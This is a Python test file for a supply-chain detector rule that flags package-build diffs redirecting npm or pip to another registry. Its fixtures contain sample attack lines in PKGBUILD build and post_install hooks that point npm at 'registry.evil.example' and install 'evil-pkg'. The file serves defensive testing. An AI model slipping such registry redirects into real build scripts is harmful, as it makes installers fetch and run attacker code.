"""H106: a build or install step redirects a package manager's registry."""

from trustsight.analysis import _structural_findings
from trustsight.differ import extract_urls_from_diff


def structural(diff_text: str) -> list[dict]:
    return _structural_findings(
        diff_text, extract_urls_from_diff(diff_text), {}, config={})


def h106(diff_text: str) -> list[dict]:
    return [f for f in structural(diff_text) if f["rule_id"] == "H106"]


def test_h106_high_when_the_override_is_paired_with_a_resolution():
    diff = """--- a/PKGBUILD
+++ b/PKGBUILD
@@ -1,2 +1,6 @@
 pkgname=x
+build() {
+  npm config set registry https://registry.evil.example
+  npm install evil-pkg
+}
"""
    findings = h106(diff)
    assert len(findings) == 1
    assert findings[0]["severity"] == "HIGH"
    assert "registry.evil.example" in findings[0]["match"]


def test_h106_medium_without_a_resolution():
    diff = """--- a/PKGBUILD
+++ b/PKGBUILD
@@ -1,2 +1,5 @@
 pkgname=x
+build() {
+  PIP_INDEX_URL=https://mirror.example/simple
+}
"""
    findings = h106(diff)
    assert len(findings) == 1
    assert findings[0]["severity"] == "MEDIUM"


def test_h106_fires_in_an_install_hook():
    diff = """--- a/PKGBUILD
+++ b/PKGBUILD
@@ -1,2 +1,6 @@
 pkgname=x
+post_install() {
+  npm --registry https://registry.evil.example install evil-pkg
+}
"""
    assert h106(diff)


def test_h106_quiet_on_a_read_only_registry_query():
    diff = """--- a/PKGBUILD
+++ b/PKGBUILD
@@ -1,2 +1,4 @@
 pkgname=x
+build() {
+  npm config get registry
+}
"""
    assert h106(diff) == []
